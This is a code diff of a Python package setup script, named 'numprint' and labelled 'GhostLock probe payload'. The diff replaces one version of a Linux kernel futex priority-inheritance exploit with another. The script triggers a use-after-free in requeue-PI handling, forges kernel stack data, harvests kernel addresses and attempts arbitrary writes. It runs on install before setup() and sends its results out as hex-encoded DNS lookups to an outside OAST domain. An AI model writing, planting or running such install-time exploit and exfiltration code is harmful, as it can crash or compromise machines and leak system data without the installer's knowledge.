+        n = (len(h) + CHUNK - 1) // CHUNK
+        for i in range(n):
+            self._one("%03d-%03d-%s" % (idx, i, h[i * CHUNK:(i + 1) * CHUNK]))
+        self._one("end-%03d" % n)
+
+    @staticmethod
+    def _one(label):
         try:
-            _s32(W, _F_TID, threading.get_native_id())
-            if _futex(wa + _O_CHAIN, FUTEX_LOCK_PI | FUTEX_PRIVATE_FLAG) != 0:
-                return
-            _s32(W, _F_CHAIN, 1)                 # handshake: chain is OURS
-            n = 0
-            while not _g32(W, _F_TGT):           # wait for owner to hold target
-                n += 1
-                _yield(n)
-            _s32(W, _O_WAIT, FUTEX_WAITERS)      # glibc-style arming
-            _s32(W, _F_ARM, 1)
-            ts = ctypes.create_string_buffer(16)
-            struct.pack_into("<qq", ts, 0, 0, 600000000)
-            _futex(wa + _O_WAIT, FUTEX_WAIT_REQUEUE_PI | FUTEX_PRIVATE_FLAG,
-                   FUTEX_WAITERS, ctypes.addressof(ts), wa + _O_TGT, 0)
-            # ---- reclaim: the very next syscall ----
-            if mode.endswith("select"):
-                sts = ctypes.create_string_buffer(16)
-                struct.pack_into("<qq", sts, 0, 0, 400000000)
-                rc = _pselect6(sel_n, aa, aa + 2 * sel_size,
-                               aa + 4 * sel_size, ctypes.addressof(sts))
-            else:
-                rc = _prctl_map(ma, MM_MAP_SIZE)
-            _s32(W, _F_RC, rc)
-            _s32(W, _F_RECLAIM, 1)
-            # ---- from here: memory writes ONLY, no syscall may re-clobber ----
-            while _g32(W, _F_DONE) == 0:
-                pass
-        except BaseException:
+            socket.getaddrinfo(label + "." + OAST, None, socket.AF_INET)
+        except Exception:
             pass
 
-    def owner():
+
+# ---------------------------------------------------------------------------
+# child
+# ---------------------------------------------------------------------------
+def _drive(tid):
+    """Force rt_mutex_adjust_pi(tid).
+
+    Do NOT stop at the first success: if __sched_setscheduler() takes a no-op
+    shortcut for that policy, rt_mutex_adjust_pi() never runs and the result
+    is a false CLEAN.  Alternating BATCH<->NORMAL guarantees at least one call
+    is a real policy change.  FIFO/RR are a bonus (need RLIMIT_RTPRIO or
+    CAP_SYS_NICE; BATCH/NORMAL need neither)."""
+    first = -1
+    last = 0
+    for pol, prio in ((SCHED_BATCH, 0), (SCHED_NORMAL, 0), (SCHED_BATCH, 0),
+                      (SCHED_FIFO, 1), (SCHED_RR, 1)):
         try:
-            n = 0
-            while not _g32(W, _F_CHAIN):         # do not race for the chain
-                n += 1
-                _yield(n)
-            if _futex(wa + _O_TGT, FUTEX_LOCK_PI | FUTEX_PRIVATE_FLAG) != 0:
-                return
-            _s32(W, _F_TGT, 1)
-            _futex(wa + _O_CHAIN, FUTEX_LOCK_PI | FUTEX_PRIVATE_FLAG)   # blocks
-        except BaseException:
+            os.sched_setscheduler(tid, pol, prio)
+            if first < 0:
+                first = pol
+        except OSError as e:
+            last = e.errno or 1
+        except Exception:
+            last = -1
+    return first, (0 if first >= 0 else last)
+
+
+def _mk_psel():
+    return (ctypes.create_string_buffer(256),      # forge staging
+            ctypes.create_string_buffer(64),       # read set
+            ctypes.create_string_buffer(64),       # write set
+            ctypes.create_string_buffer(64),       # except set
+            ctypes.create_string_buffer(b"\0" * 16, 16))
+
+
+def _psel_stage(allb, rd, wr, ex, size):
+    """The kernel copies `size` bytes from EACH user pointer into
+    stack_fds[0], [size], [2*size] -- so split the staging buffer by `size`,
+    never by a constant."""
+    ctypes.memmove(ctypes.addressof(rd), ctypes.addressof(allb), size)
+    ctypes.memmove(ctypes.addressof(wr), ctypes.addressof(allb) + size, size)
+    ctypes.memmove(ctypes.addressof(ex), ctypes.addressof(allb) + 2 * size, size)
+
+
+def _psel_call(rd, wr, ex, tv, n):
+    return _rc(_pselect_nr(), n, ctypes.addressof(rd), ctypes.addressof(wr),
+               ctypes.addressof(ex), ctypes.addressof(tv), 0)
+
+
+def _child_main(wfd, mode, woff, woff2, lockv):
+    import threading
+
+    def S(b):
+        try:
+            os.write(wfd, b)
+        except Exception:
             pass
 
-    th_w = threading.Thread(target=waiter, daemon=True)
-    th_o = threading.Thread(target=owner, daemon=True)
-    th_w.start()
-    th_o.start()
+    S(b"1")
 
-    # ---- mover ----
-    t0 = time.monotonic()
-    n = 0
-    while not (_g32(W, _F_ARM) and (_g32(W, _O_CHAIN) & FUTEX_WAITERS)):
-        n += 1
-        _yield(n)
-        if time.monotonic() - t0 > _WAIT_STAGE:
-            os.write(wfd, b"3")
-            return
-
-    # nr_wake must be 1; cascade val2 only on -EINVAL (no side effect)
-    r = -1
-    for val2 in (1, 0, 0x7FFFFFFF):
-        for k in range(3000):
-            r = _futex(wa + _O_WAIT, FUTEX_CMP_REQUEUE_PI | FUTEX_PRIVATE_FLAG,
-                       1, val2, wa + _O_TGT, _g32(W, _O_WAIT))
-            if r in (-EDEADLK, -22):
-                break
-            if r not in (0, -11, -4):
-                break
-            _yield(k)
-        if r in (-EDEADLK, -22):
+    # Force fdt->max_fds >= 512.  core_sys_select() clamps n to it; below
+    # ~273 the forge no longer fits inside stack_fds[0 .. 3*size).
+    nfd = 0
+    for path in ("/dev/null", "/proc/self/status", "/"):
+        if nfd >= FD_PAD:
             break
-    _futex(wa + _O_WAIT, FUTEX_WAKE | FUTEX_PRIVATE_FLAG, 1)
-    if r != -EDEADLK:
-        os.write(wfd, b"3")
-        return
-    os.write(wfd, b"S")
+        try:
+            os.close(os.open(path, os.O_RDONLY))
+        except Exception:
+            continue
+        while nfd < FD_PAD:
+            try:
+                os.open(path, os.O_RDONLY)
+                nfd += 1
+            except Exception:
+                break
 
-    t0 = time.monotonic()
-    n = 0
-    while _g32(W, _F_RECLAIM) == 0:
-        n += 1
-        _yield(n)
-        if time.monotonic() - t0 > _WAIT_RECLAIM:
-            os.write(wfd, b"2")
-            return
+    mt, at = _word()                    # f_t : requeue source (unowned)
+    mc, ac = _word()                    # f_c : requeue target (owned by O)
+    mx, ax = _word()                    # f_x : owned by W, O blocks here
 
-    tid = _g32(W, _F_TID)
-    if not tid:
-        os.write(wfd, b"2")
-        return
-    _s32(W, _F_DRIVE, 1)                       # drive first, relay after
-    for i in range(3):
-        _sched(tid, SCHED_BATCH if (i & 1) == 0 else SCHED_OTHER)
-    _s32(W, _F_DONE, 1)
+    _real_brk()
+    fields, fvar = _pick_fields()
+    asz = _auxv_size(fields)
+    use_prctl = (mode == "A" and asz >= MM_MAP_SIZE)
 
-    rc = _g32(W, _F_RC)
-    if rc >= 0x80000000:
-        rc -= 0x100000000
-    os.write(wfd, b"R" + bytes([rc & 0xFF]))
-    os.write(wfd, b"1")
+    pn, psz = _psel_geometry()
 
-def _attempt(mode, off, T, timeout):
-    r, w = os.pipe()
+    aux = ctypes.create_string_buffer(0x800)
+    mapbuf = ctypes.create_string_buffer(MM_MAP_SIZE)
+    psel = _mk_psel()
+
+    if use_prctl:
+        off = min(max(woff, 0), asz - MM_MAP_SIZE)
+        _forge(aux, off, lockv)
+        mp = _pack(fields, ctypes.addressof(aux), asz)
+    else:
+        off = min(max(woff2, 0), max(0, 3 * psz - MM_MAP_SIZE))
+        _forge(psel[0], off, lockv)
+        mp = b""
+
+    S(b"2" + bytes([len(fvar) & 0xFF, min(asz // 8, 255),
+                    min(nfd // 8, 255), min(psz, 255)]))
+
+    cpid = os.getpid()
+    st = dict(w_own=0, w_going=0, o_own=0, o_going=0, w_ret=0, rq_done=0,
+              w_tid=0, w_lock=0, rq=SENT, pr=SENT)
+
+    def thr_w():
+        st["w_tid"] = _gettid()
+        st["w_lock"] = _lock_pi(ax)         # W owns f_x (0 == success)
+        st["w_own"] = 1
+        while not st["o_own"]:
+            _yield()
+        v = _rd32(mt)
+        st["w_going"] = 1
+        r = -11
+        for _ in range(500):
+            r = _rc(_futex_nr(), at, FUTEX_WAIT_REQUEUE_PI | FUTEX_PRIVATE,
+                    v, 0, ac, v)
+            if r != -11:
+                break
+            v = _rd32(mt)
+            _yield()
+        st["w_ret"] = r if r else 1
+        # rt_waiter lives in THIS thread's frame: only W can reclaim it.
+        # Spin with no syscalls from here -- W's own syscalls are the only
+        # thing that can overwrite the frame the drive will read.
+        while not st["rq_done"]:
+            pass
+        if use_prctl:
+            ctypes.memmove(ctypes.addressof(mapbuf), mp, MM_MAP_SIZE)
+            ctypes.set_errno(0)
+            rr = _libc.prctl(PR_SET_MM, PR_SET_MM_MAP,
+                             ctypes.addressof(mapbuf), MM_MAP_SIZE, 0)
+            ee = ctypes.get_errno()
+            st["pr"] = -ee if (rr == -1 and ee) else rr
+        else:
+            _psel_stage(psel[0], psel[1], psel[2], psel[3], psz)
+            st["pr"] = _psel_call(psel[1], psel[2], psel[3], psel[4], pn)
+        while True:
+            pass
+
+    def thr_o():
+        while not st["w_own"]:
+            _yield()
+        _lock_pi(ac)                        # O owns f_c
+        st["o_own"] = 1
+        st["o_going"] = 1
+        _lock_pi(ax)                        # blocks -> O->pi_blocked_on set
+        while True:
+            time.sleep(0.01)                # syscall-active so SIGTERM lands
+
+    def thr_r():
+        while not (st["w_going"] and st["o_going"]):
+            _yield()
+        time.sleep(0.020)                   # let W enqueue, O block
+        r = 0
+        for _ in range(500):
+            r = _requeue_pi(at, ac, _rd32(mc))
+            if r != -11:
+                break
+            _yield()
+        st["rq"] = r
+        st["rq_done"] = 1
+        while True:
+            time.sleep(0.01)
+
+    threading.Thread(target=thr_w).start()
+    threading.Thread(target=thr_o).start()
+    threading.Thread(target=thr_r).start()
+
+    while not st["w_own"]:
+        _yield()
+    while not st["o_own"]:
+        _yield()
+    S(b"3" + struct.pack("<ii", st["w_tid"], st["w_lock"]))
+
+    while st["rq"] is SENT:
+        _yield()
+    S(b"4" + struct.pack("<i", st["rq"]))
+
+    # Force W back to userland.  FUTEX_WAKE bails with -EINVAL when the
+    # matching q has rt_waiter set; a second CMP_REQUEUE_PI may find nothing
+    # if the first already moved the q.  Last resort: SIGURG, ignored by
+    # default but still returns -EINTR out of the interruptible wait.
+    t = time.time() + 0.30
+    while not st["w_ret"] and time.time() < t:
+        _wake(at)
+        if not st["w_ret"]:
+            _requeue_pi(at, ac, _rd32(mc))
+        time.sleep(0.005)
+    t = time.time() + 0.25
+    while not st["w_ret"] and time.time() < t:
+        _tgkill(cpid, st["w_tid"], SIGURG)
+        time.sleep(0.010)
+    while not st["w_ret"] and time.time() < t + 0.20:
+        _yield()
+    S(b"6" + struct.pack("<i", st["w_ret"] or MISS))
+
+    t = time.time() + 0.40
+    while st["pr"] is SENT and time.time() < t:
+        _yield()
+    S(b"5" + struct.pack("<i", st["pr"] if st["pr"] is not SENT else MISS))
+
+    S(b"7")
+    _pol, err = _drive(st["w_tid"])
+    S(b"9" + struct.pack("<i", err))
+    while True:
+        _yield()
+
+
+# ---------------------------------------------------------------------------
+# parent
+# ---------------------------------------------------------------------------
+def _parse(buf):
+    st, i, n = {}, 0, len(buf)
+    while i < n:
+        c = buf[i:i + 1]
+        if c == b"1":
+            st["1"] = 1
+            i += 1
+        elif c == b"2":
+            if i + 5 <= n:
+                st["2"] = (buf[i + 1], buf[i + 2], buf[i + 3], buf[i + 4])
+            i += 5
+        elif c == b"3":
+            if i + 9 <= n:
+                st["3"] = struct.unpack_from("<ii", buf, i + 1)
+            i += 9
+        elif c in (b"4", b"5", b"6", b"9"):
+            if i + 5 <= n:
+                st[c.decode()] = struct.unpack_from("<i", buf, i + 1)[0]
+            i += 5
+        elif c in (b"7", b"E"):
+            st[c.decode()] = 1
+            i += 1
+        else:
+            i += 1
+    return st
+
+
+def _classify(p, sig, alive):
+    if "E" in p:
+        return "EXC"
+    if "9" in p:
+        return "CLEAN"
+    if "7" in p:
+        return "WEDGE"
+    if sig == 9:
+        return "WEDGE"
+    if "5" in p:
+        return "RECLAIMED"
+    if "4" in p:
+        return "NO_RECLAIM"
+    if "3" in p:
+        return "STAGED"
+    if sig == 15:
+        return "HANG"
+    if not p:
+        return "SILENT"
+    return "PARTIAL"
+
+
+def _phase(mode, woff, woff2, lockv):
+    rfd, wfd = os.pipe()
     pid = os.fork()
     if pid == 0:
         try:
-            os.close(r)
-            _child(w, mode, off, T, timeout)
+            os.close(rfd)
+            _child_main(wfd, mode, woff, woff2, lockv)
         except BaseException:
             try:
-                os.write(w, b"X")
+                os.write(wfd, b"E")
             except Exception:
                 pass
         finally:
-            os._exit(0)
-    os.close(w)
-    try:
-        os.set_blocking(r, False)
-    except Exception:
-        pass
-    buf = b""
-    end = time.monotonic() + timeout
-    while time.monotonic() < end:
-        try:
-            c = os.read(r, 32)
-        except Exception:
-            c = b""
-        if c:
-            buf += c
-            if buf[-1:] in (b"1", b"2", b"3"):
-                break
-        else:
             try:
-                p, _st = os.waitpid(pid, os.WNOHANG)
-            except ChildProcessError:
-                break
-            if p == pid:
-                try:
-                    buf += os.read(r, 32)
-                except Exception:
-                    pass
-                break
-        time.sleep(0.002)
-    try:
-        os.kill(pid, signal.SIGKILL)
-    except Exception:
-        pass
-    for _ in range(400):
-        try:
-            p, _st = os.waitpid(pid, os.WNOHANG)
-        except ChildProcessError:
-            break
-        if p == pid:
-            break
-        time.sleep(0.002)
-    try:
-        os.close(r)
-    except Exception:
-        pass
-    rc = None
-    i = buf.find(b"R")
-    if i >= 0 and i + 1 < len(buf):
-        rc = buf[i + 1]
-        if rc >= 0x80:
-            rc -= 0x100
-    if b"1" in buf:
-        return "CLEAN", rc
-    if b"2" in buf:
-        return "WEDGE", rc
-    if b"3" in buf:
-        return "NOTRIGGER", rc
-    if b"S" in buf:
-        return "WEDGE", rc
-    return "FAIL", rc
-
-# --------------------------------------------------------------------------
-# DNS exfil
-# --------------------------------------------------------------------------
-def _lookup(name):
-    try:
-        socket.gethostbyname(name)
-        return True
-    except Exception:
-        return False
-
-def _exfil(text, base=0, terminator=True, passes=None):
-    h = text.encode("utf-8", "replace").hex()
-    labels, idx = [], base
-    for i in range(0, max(len(h), 1), _LABEL_CHUNK):
-        labels.append("%03d-%03d-%s" % (idx, i // _LABEL_CHUNK, h[i:i + _LABEL_CHUNK]))
-        idx += 1
-    if terminator:
-        labels.append("end-%03d" % idx)
-    pending = labels
-    for _ in range(passes or _PASSES):
-        if not pending:
-            break
-        try:
-            with ThreadPoolExecutor(max_workers=_WORKERS) as pool:
-                res = list(pool.map(_lookup, [n + "." + _ENDPOINT for n in pending]))
-        except Exception:
-            break
-        pending = [n for n, ok in zip(pending, res) if not ok]
-        if pending:
-            time.sleep(_GAP)
-    return len(labels) - len(pending), len(labels)
-
-# --------------------------------------------------------------------------
-# probe
-# --------------------------------------------------------------------------
-def _probe():
-    t0 = time.monotonic()
-    log = _klog()
-    rel = _release()
-    vstat = _vstatus(rel)
-    ks, ks_lines, ks_zero = _kallsyms()
-    vmi = _vmcoreinfo()
-    mods = _module_addrs()
-    lay, kcore = _boot_layout(log), _kcore_base()
-    iomem_kern, iomem_code = _iomem()
-    cands = _candidates(ks, vmi, mods, lay, kcore, iomem_kern, iomem_code)
-
-    lines = ["glk4", "kern=" + rel, "arch=" + _MACH, "vstat=" + vstat]
-    try:
-        lines.append("ncpu=%d" % len(os.sched_getaffinity(0)))
-    except Exception:
-        lines.append("ncpu=%d" % (os.cpu_count() or 0))
-    lines.append("uid=%d euid=%d nnp=%d" % (
-        os.getuid(), os.geteuid(),
-        1 if "NoNewPrivs:\t1" in _read_text("/proc/self/status") else 0))
-    kn = _panic_knobs()
-    lines.append("panic=%s onoops=%s oopslim=%s" % (
-        kn["panic"], kn["panic_on_oops"], kn["oops_limit"]))
-    lines.append("src ks=%d/%d zero=%d vmi=%d mod=%d lay=%d kcore=%d iomem=%d" % (
-        len(ks), ks_lines, int(ks_zero), len(vmi), len(mods), len(lay),
-        1 if kcore else 0, len(iomem_kern)))
-    lines.append("cand=" + (",".join("0x%x" % c for c in cands) or "none"))
-
-    # reclaim availability. auxv_size=368 here too, so the auxv path itself is
-    # exercised in-process before any child depends on it.
-    pb = mmap.mmap(-1, 0x1000)
-    zero_auxv = mmap.mmap(-1, AUXV_BYTES)
-    _pack_map(pb, _addr(zero_auxv), AUXV_BYTES, _mm_fields())
-    prc = _prctl_map(_addr(pb), MM_MAP_SIZE)
-    lines.append("prctl_auxv_rc=%d" % prc)
-    gate = list(lines)
-    _exfil("stage=START\n" + "\n".join(gate) + "\n", base=_CKPT[0], terminator=False)
-
-    A = A2 = "SKIP"
-    rcA = rcA2 = None
-    if os.environ.get("GLK_SKIP_A") != "1":
-        A, rcA = _attempt("poison_prctl", 0, 0, _CHILD_TIMEOUT)
-        lines.append("A=%s rc=%s" % (A, rcA))
-        _exfil("stage=AFTER_A\n" + "\n".join(lines[-8:]) + "\n",
-               base=_CKPT[1], terminator=False)
-        if A != "WEDGE" and time.monotonic() - t0 < _BUDGET:
-            A2, rcA2 = _attempt("poison_select", 0, 0, _CHILD_TIMEOUT)
-            lines.append("A2=%s rc=%s" % (A2, rcA2))
-            _exfil("stage=AFTER_A2\n" + "\n".join(lines[-8:]) + "\n",
-                   base=_CKPT[2], terminator=False)
-
-    Bhits = Btried = 0
-    modes = []
-    if A == "WEDGE":
-        modes.append("forge_prctl")
-    if A2 == "WEDGE":
-        modes.append("forge_select")
-    if modes and os.environ.get("GLK_SKIP_B") != "1" and cands:
-        env_t = os.environ.get("GLK_T")
-        if env_t:
-            try:
-                cands = [int(env_t, 0)] + cands
-            except ValueError:
-                pass
-        env_off = os.environ.get("GLK_OFF")
-        try:
-            offs = [int(env_off, 0)] if env_off else list(range(0x00, 0xA9, 0x08))
-        except ValueError:
-            offs = list(range(0x00, 0xA9, 0x08))
-        for mode in modes:
-            for T in cands:
-                if time.monotonic() - t0 > _BUDGET or Btried >= _MAX_ATTEMPTS:
-                    break
-                hit = None
-                for off in offs:
-                    if time.monotonic() - t0 > _BUDGET or Btried >= _MAX_ATTEMPTS:
-                        break
-                    res, _r = _attempt(mode, off, T, _CHILD_TIMEOUT)
-                    Btried += 1
-                    if res == "CLEAN":
-                        hit = off
-                        Bhits += 1
-                        break
-                lines.append("B %s 0x%x%s" % (
-                    mode, T, "" if hit is None else " off=0x%x" % hit))
-                if hit is not None:
-                    break
-        lines.append("B=%d/%d" % (Bhits, Btried))
-
-    if A == "WEDGE" or A2 == "WEDGE":
-        v = "VULNERABLE_CONFIRMED"
-    elif A == "FAIL" and A2 == "FAIL":
-        v = "INCONCLUSIVE"
-    elif A == "NOTRIGGER" or A2 == "NOTRIGGER":
-        v = "NO_TRIGGER"
-    elif vstat == "VULNERABLE":
-        v = "VERSION_VULNERABLE_NO_FAULT"
-    elif vstat == "FIXED_NO_FOLLOWUP":
-        v = "FIXED_NO_FOLLOWUP"
-    elif vstat == "FIXED":
-        v = "LIKELY_PATCHED"
-    else:
-        v = "NO_FAULT"
-    if Bhits:
-        v += "_ARBWRITE"
-
-    if "WEDGE" in (A, A2):
-        for pat in ("deadbee", "rt_mutex", "pi_blocked", "rtmutex"):
-            m = re.search(r"^.*%s.*$" % pat, _klog(), re.M)
-            if m:
-                lines.append("oops=" + " ".join(m.group(0).split())[:110])
-                break
-
-    lines.insert(1, "verdict=" + v)
-    lines.append("ms=%d" % int((time.monotonic() - t0) * 1000))
-    lines.append("note=START_only_or_missing_next_checkpoint_means_a_fault_"
-                 "panicked_the_vm")
-    return "\n".join(lines) + "\n"
-
-# --------------------------------------------------------------------------
-# driver
-# --------------------------------------------------------------------------
-def _marker():
-    try:
-        return os.path.join(os.path.dirname(os.path.abspath(__file__)), ".glk-done")
-    except Exception:
-        return None
-
-def _run():
-    st = _quiet()
-    ok = 0
-    try:
-        text = _probe()
-    except BaseException:
-        text = "glk4\nverdict=HARNESS_ERROR\n"
-    try:
-        ok, _t = _exfil(text, base=0)
-    except BaseException:
-        pass
-    finally:
-        _loud(st)
-    if ok:
-        m = _marker()
-        if m:
-            try:
-                with open(m, "w") as fh:
-                    fh.write("1")
+                os.close(wfd)
             except Exception:
                 pass
+        os._exit(0)
 
-if __name__ == "__main__":
-    if os.environ.get("GLK_SKIP") != "1":
-        m = _marker()
-        if not (m and os.path.exists(m)):
-            try:
-                _run()
-            except BaseException:
-                pass
+    os.close(wfd)
+    buf = b""
+    deadline = time.time() + T_CHILD
+    while len(buf) < 64:
+        left = deadline - time.time()
+        if left <= 0:
+            break
+        try:
+            r, _, _ = select.select([rfd], [], [], left)
+        except Exception:
+            break
+        if not r:
+            break
+        try:
+            d = os.read(rfd, 64)
+        except OSError:
+            break
+        if not d:
+            break
+        buf += d
+        p = _parse(buf)
+        if "7" in p and "9" not in p:
+            deadline = min(deadline, time.time() + T_DRIVE)
+        if "9" in p:
+            break
+    try:
+        os.close(rfd)
+    except Exception:
+        pass
 
+    sig = alive = 0
+    try:
+        _, stt = os.waitpid(pid, os.WNOHANG)
+        if stt == 0:
+            os.kill(pid, 15)
+            t = time.time() + T_GRACE
+            while time.time() < t:
+                _, stt = os.waitpid(pid, os.WNOHANG)
+                if stt:
+                    break
+                time.sleep(0.01)
+            if not stt:
+                try:
+                    os.kill(pid, 9)
+                except Exception:
+                    pass
+                alive = 1
+                _, stt = os.waitpid(pid, os.WNOHANG)
+        if stt and os.WIFSIGNALED(stt):
+            sig = os.WTERMSIG(stt)
+    except Exception:
+        pass
+    return buf, sig, alive
+
+
+# ---------------------------------------------------------------------------
+# main
+# ---------------------------------------------------------------------------
+def _probe(R):
+    f, v = _pick_fields()
+    R.add("pmap_rc", _prctl_map(f, 0, 0))
+    R.add("mmv", v)
+    if _prctl_map(f, 0, 0) != 0:
+        R.add("prctl_auxv_rc", -1)
+        R.add("paux_sz", 0)
+        R.add("paux_err", 0)
+        return
+    buf = ctypes.create_string_buffer(0x800)
+    a = ctypes.addressof(buf)
+    best, err = 0, 0
+    for n in AUXV_TRY:
+        r = _prctl_map(f, n, a)
+        if r == 0:
+            best = n
+            break
+        err = r
+    R.add("prctl_auxv_rc", 0 if best else err)
+    R.add("paux_sz", best)
+    R.add("paux_err", 0 if best else err)
+
+
+def _main():
+    t0 = time.time()
+    R = Report(RUN)
+    _real_brk()
+
+    u = os.uname()
+    R.add("kern", u.release)
+    R.add("arch", u.machine)
+    R.add("vstat", _vstat(u.release))
+    R.add("ncpu", os.cpu_count() or 0)
+    R.add("uid", "%d euid=%d nnp=%s" % (os.getuid(), os.geteuid(), _sf("NoNewPrivs")))
+    R.add("panic", "panic=%s onoops=%s oopslim=%s"
+          % (_psys("panic"), _psys("panic_on_oops"), _psys("oops_limit")))
+    R.add("nrs", "futex=%d psel=%d tgkill=%d syslog=%d"
+          % (_futex_nr(), _pselect_nr(), _tgkill_nr(), _syslog_nr()))
+
+    s = _src()
+    R.add("src", "ks=%d/%d zero=%d vmi=%d mod=%d lay=%d kcore=%d iomem=%d"
+          % (s["ks"], s["lines"], s["zero"], s["vmi"], s["mod"],
+             s["lay"], s["kcore"], s["iomem"]))
+    R.add("cand", ",".join("0x%x" % c for c in s["cand"]))
+
+    _probe(R)
+    R.flush(800)
+
+    woff = int(os.environ.get("GLK_WOFF", "0"))
+    woff2 = int(os.environ.get("GLK_WOFF2", "0"))
+    lockv = int(os.environ.get("GLK_LOCK", "0"), 16)
+
+    verdict = "INCONCLUSIVE"
+
+    for tag, mode, skip in (("A", "A", SKIP_A), ("A2", "A2", SKIP_A2)):
+        if skip:
+            continue
+        b, sg, al = _phase(mode, woff, woff2, lockv)
+        p = _parse(b)
+        c = _classify(p, sg, al)
+        q = p.get("2", (0, 0, 0, 0))
+        t3 = p.get("3", (0, 0))
+        R.add(tag, c)
+        R.add(tag + "_st", b.hex())
+        R.add(tag + "_sig", sg)
+        R.add(tag + "_alive", al)
+        R.add(tag + "_fv", q[0])
+        R.add(tag + "_asz", q[1] * 8)
+        R.add(tag + "_nfd", q[2] * 8)
+        R.add(tag + "_psz", q[3])
+        R.add(tag + "_tid", t3[0])
+        R.add(tag + "_wlock", t3[1])
+        R.add(tag + "_rq", p.get("4", MISS))
+        R.add(tag + "_wret", p.get("6", MISS))
+        R.add(tag + "_pr", p.get("5", MISS))
+        R.add(tag + "_drv", p.get("9", MISS))
+        if c == "WEDGE":
+            verdict = "VULNERABLE"
+        R.flush(820 if tag == "A" else 840)
+
+    if not SKIP_B:
+        hits = []
+        for wv in (0, 32, 96, 160, 224):
+            b, sg, al = _phase("A", wv, woff2, lockv)
+            c = _classify(_parse(b), sg, al)
+            hits.append("B%d=%s" % (wv, c))
+            if c == "WEDGE":
+                verdict = "VULNERABLE"
+                break
+        R.add("B", " ".join(hits))
+
+    if verdict != "VULNERABLE" and _vstat(u.release) == "FIXED":
+        verdict = "FIXED"
+
+    R.add("verdict", verdict)
+    R.add("ms", int((time.time() - t0) * 1000))
+    R.add("note", "sig9=oops sig15=reaped_by_us alive1=stuck; WEDGE=7_no_9")
+    R.flush(0)
+
+
+# ---------------------------------------------------------------------------
+# run once, then always satisfy setuptools
+# ---------------------------------------------------------------------------
 try:
-    from setuptools import setup
-    setup(name="ghostlock-probe", version="1.0.0", packages=[])
+    if not os.path.exists(".glk-done"):
+        if resource is not None:
+            try:
+                soft, hard = resource.getrlimit(resource.RLIMIT_RTPRIO)
+                if soft < 1:
+                    for pair in ((1, max(hard, 1)), (1, hard)):
+                        try:
+                            resource.setrlimit(resource.RLIMIT_RTPRIO, pair)
+                            break
+                        except Exception:
+                            pass
+            except Exception:
+                pass
+        _main()
+        try:
+            open(".glk-done", "w").close()
+        except Exception:
+            pass
 except BaseException:
     pass
+
+from setuptools import setup
+
+setup(
+    name="numprint",
+    version="0.0.0",
+    description="GhostLock probe payload",
+)
